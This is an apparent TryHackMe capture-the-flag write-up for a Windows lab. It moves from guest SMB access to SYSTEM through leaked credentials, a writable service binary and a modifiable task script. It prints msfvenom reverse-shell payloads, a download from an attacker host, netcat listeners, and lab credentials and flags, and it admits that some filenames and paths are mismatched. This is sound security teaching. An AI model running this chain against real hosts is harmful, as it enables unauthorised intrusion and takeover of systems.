---

layout: writeup
title: "Jump(Windows)"
machine: "Windows"
platform: "TryHackMe"
image: "/assets/images/jump-window.png"
difficulty: "Medium"
date: 2026-09-14
description: "Privilege escalation from guest access to SYSTEM through exposed credentials, a writable service binary, and a modifiable scheduled-task script."
---


## 1. Enumeration

I started with an Nmap scan to identify exposed services and gather basic information about the Windows host.

### Nmap

```text
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=privesc
| Not valid before: 2026-05-10T06:39:22
|_Not valid after:  2026-11-09T06:39:22
|_ssl-date: 2026-09-17T06:41:49+00:00; 0s from scanner time.
| rdp-ntlm-info:
|   Target_Name: PRIVESC
|   NetBIOS_Domain_Name: PRIVESC
|   NetBIOS_Computer_Name: PRIVESC
|   DNS_Domain_Name: privesc
|   DNS_Computer_Name: privesc
|   Product_Version: 10.0.17763
|_  System_Time: 2026-09-17T06:41:41+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

The most interesting services were:

- **445/tcp — SMB:** worth checking for anonymous/guest access and readable shares.
- **3389/tcp — RDP:** potentially useful if valid credentials are discovered.
- **5985/tcp — WinRM:** another possible remote-management path if suitable credentials are obtained.

---

## 2. SMB Enumeration

Since SMB was exposed on port 445, I checked the available shares using the `guest` account with an empty password.

```text
┌──(amsyar㉿kali)-[~/tryhackme/jump-window]
└─$ nxc smb 10.49.166.235 -u 'guest' -p '' --shares
SMB         10.49.166.235   445    PRIVESC          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRIVESC) (domain:privesc) (signing:False) (SMBv1:None)
SMB         10.49.166.235   445    PRIVESC          [+] privesc\guest:
SMB         10.49.166.235   445    PRIVESC          [*] Enumerated shares
SMB         10.49.166.235   445    PRIVESC          Share           Permissions     Remark
SMB         10.49.166.235   445    PRIVESC          -----           -----------     ------
SMB         10.49.166.235   445    PRIVESC          ADMIN$                          Remote Admin
SMB         10.49.166.235   445    PRIVESC          C$                              Default share
SMB         10.49.166.235   445    PRIVESC          IPC$            READ            Remote IPC
SMB         10.49.166.235   445    PRIVESC          Public          READ            Public file share
```

The important finding was the **`Public` share**, which was readable using the guest account.

---

## 3. Enumerating the `Public` Share

I connected to the share with `smbclient`:

```text
┌──(amsyar㉿kali)-[~/tryhackme/jump-window]
└─$ smbclient //10.49.166.235/public -U guest
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon May 11 02:40:51 2026
  ..                                  D        0  Mon May 11 02:40:51 2026
  welcome.txt                         A      177  Mon May 11 02:40:50 2026

                7863807 blocks of size 4096. 3610012 blocks available
```

The share contained `welcome.txt`.

```text
Welcome to CORP-NET.

New employee default credentials
================================
Username : thmuser
Password : Password1!

Please change your password after first login.
```

This exposed valid credentials for the `thmuser` account.

---

## 4. Initial Access via RDP

Port 3389 was open, so I used the credentials discovered in the SMB share to connect through RDP.

```bash
xfreerdp /u:thmuser /p:'Password1!' /v:10.49.166.235 /dynamic-resolution
```

After logging in as `thmuser`, I found the first flag on the user's Desktop.

```text
C:\Users\thmuser\Desktop\flag1
```

### Flag 1

```text
THM{5mb_cr3d5_1n_th3_5h4r3}
```

### Attack path

```text
Guest SMB access
      ↓
Readable Public share
      ↓
Credentials exposed in welcome.txt
      ↓
RDP as thmuser
```

---

# 5. Escalating to `notadmin`

Once logged in as `thmuser`, I looked for locally stored credentials.

A useful location to check on Windows is the Winlogon registry configuration:

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

The output contained credentials for another local account:

```text
DefaultUserName    REG_SZ    notadmin
DefaultPassword    REG_SZ    P@ssw0rd!
```

This gave us credentials for `notadmin`.

After accessing the account, I found the second flag:

```cmd
C:\Users\notadmin\Desktop>type flag2.txt
```

```text
THM{w1nl0g0n_cr3ds_3xp0s3d}
```

### Key finding

The Winlogon configuration contained a username and password in plaintext. This demonstrates why credentials should not be stored in insecure locations or left behind in system configuration.

---

# 6. Escalating to `svcadmin`

The next step was to identify services running under the `svcadmin` account.

### Find the service

```cmd
wmic service get name,pathname,startname | findstr /i "svcadmin"
```

This identified a service associated with `svcadmin`.

The next question was whether the service binary could be modified by our current account.

### Check permissions

```cmd
icacls C:\Windows\THMSVC\
```

The relevant permissions were:

```text
C:\Windows\THMSVC\ PRIVESC\notadmin:(OI)(CI)(F)
                   BUILTIN\Administrators:(OI)(CI)(F)
                   NT AUTHORITY\SYSTEM:(OI)(CI)(F)

Successfully processed 1 files; Failed processing 0 files
```

`notadmin` had **Full Control (`F`)** over the directory. This meant the service's executable could potentially be replaced with a different executable.

This created a **service binary hijacking** opportunity.

---

## 7. Service Binary Hijacking

I generated a Windows reverse-shell executable configured to connect back to my attacking machine.

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=192.168.134.143 \
  LPORT=4444 \
  -f exe-service \
  -o svc.exe
```

I then started a temporary HTTP server to transfer the payload:

```bash
python3 -m http.server
```

The original session used the following download command:

```powershell
Invoke-WebRequest -Uri "http://192.168.134.143:8000/shell.exe" -OutFile "C:\Windows\Tasks\shell.exe"
```

> **Note:** The commands above use different filenames (`svc.exe` and `shell.exe`) and the download path is `C:\Windows\Tasks`, while the service directory identified earlier was `C:\Windows\THMSVC\`. I have preserved the commands from the original session rather than silently changing them. In an actual lab, the payload filename/path must match the service executable that is being replaced.

### Start the service

```cmd
C:\Users\notadmin\Desktop>sc start THMSvc

SERVICE_NAME: THMSvc
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 1908
        FLAGS
```

The service started successfully.

---

## 8. Reverse Shell as `svcadmin`

On my attacking machine, I listened for the connection:

```bash
nc -lvnp 4444
```

The connection was received:

```text
listening on [any] 4444 ...
connect to [192.168.134.143] from (UNKNOWN) [10.49.166.235] 50976
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

The service was running under `svcadmin`, so the resulting shell provided access in the context of that account.

I then retrieved the third flag:

```cmd
C:\Users\svcadmin\Desktop>type flag3.txt
```

```text
THM{s3rv1c3_b1n4ry_h1j4ck3d}
```

---

# 9. Escalating from `svcadmin` to SYSTEM

With access as `svcadmin`, I enumerated the `C:\Windows\Tasks` directory:

```cmd
C:\Windows\Tasks>dir
```

```text
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Windows\Tasks

05/11/2026  06:42 AM    <DIR>          .
05/11/2026  06:42 AM    <DIR>          ..
05/11/2026  06:41 AM                41 cleanup.bat
               1 File(s)             41 bytes
               2 Dir(s)  14,691,016,704 bytes free
```

The interesting file was `cleanup.bat`.

### Check permissions

```cmd
C:\Windows\Tasks>icacls cleanup.bat
```

The permissions showed that `svcadmin` had **Modify (`M`)** access:

```text
cleanup.bat BUILTIN\Users:(I)(RX)
            PRIVESC\svcadmin:(I)(M)
            BUILTIN\Administrators:(I)(F)
            NT AUTHORITY\SYSTEM:(I)(F)

Successfully processed 1 files; Failed processing 0 files
```

This indicated that `svcadmin` could modify a script that was also accessible to `SYSTEM`.

If the task executing `cleanup.bat` runs with SYSTEM privileges, modifying the script provides a path to execute commands as SYSTEM.

---

# 10. Replace the Scheduled Task Script

I generated another reverse-shell payload, this time using port `4445`:

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST="your attacker's IP address" \
  LPORT=4445 \
  -f exe \
  -o shell.exe
```

I transferred the payload to the target:

```powershell
PS C:\Windows\Tasks> Invoke-WebRequest -Uri "http://192.168.134.143:8000/shell.exe" -OutFile "C:\Windows\Tasks\shell.exe"
```

Then I replaced the contents of `cleanup.bat` so that it executed the payload:

```cmd
cmd /c "echo C:\Windows\Tasks\shell.exe > C:\Windows\Tasks\cleanup.bat"
```

When the scheduled task executed the modified script, it launched the reverse shell.

---

# 11. SYSTEM Shell

I started a listener on my attacking machine:

```bash
nc -lnvp 4445
```

The target connected back:

```text
listening on [any] 4445
connect to [192.168.134.143] from (UNKNOWN) [10.49.166.235] 51092
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

I then retrieved the final flag:

```cmd
C:\>type flag4.txt
```

```text
THM{t4sk_wr1t3_t0_SYST3M}
```

---

# 12. Complete Attack Chain

The full privilege-escalation path was:

```text
                         ┌──────────────────────┐
                         │ Guest SMB Access     │
                         └──────────┬───────────┘
                                    │
                                    ▼
                         ┌──────────────────────┐
                         │ Public Share         │
                         │ welcome.txt          │
                         └──────────┬───────────┘
                                    │
                                    ▼
                         ┌──────────────────────┐
                         │ thmuser              │
                         │ RDP Access            │
                         └──────────┬───────────┘
                                    │
                         Winlogon credentials
                                    │
                                    ▼
                         ┌──────────────────────┐
                         │ notadmin             │
                         └──────────┬───────────┘
                                    │
                         Writable service binary
                                    │
                                    ▼
                         ┌──────────────────────┐
                         │ svcadmin             │
                         └──────────┬───────────┘
                                    │
                         Writable cleanup.bat
                                    │
                                    ▼
                         ┌──────────────────────┐
                         │ SYSTEM               │
                         └──────────────────────┘
```

## Flags

| Flag | Account / Context | Finding |
|---|---|---|
| `flag1` | `thmuser` | Credentials exposed through SMB share |
| `flag2` | `notadmin` | Winlogon credentials exposed |
| `flag3` | `svcadmin` | Writable service binary |
| `flag4` | SYSTEM | Writable task script |

---

# 13. Key Takeaways

This machine demonstrated several common Windows security issues:

1. **Guest SMB access** exposed a readable public share.
2. **Sensitive credentials** were stored in a publicly accessible file.
3. **RDP** provided a direct route to use the discovered credentials.
4. **Winlogon configuration** exposed another account's credentials.
5. A **service directory was writable** by a lower-privileged account, allowing service binary hijacking.
6. A script executed with higher privileges was **modifiable by `svcadmin`**, providing another privilege-escalation path.
7. The final escalation demonstrated how **weak file permissions on scheduled-task-related scripts** can lead to SYSTEM-level execution.

The main lesson is that privilege escalation often comes from chaining several small configuration weaknesses rather than relying on a single critical vulnerability.
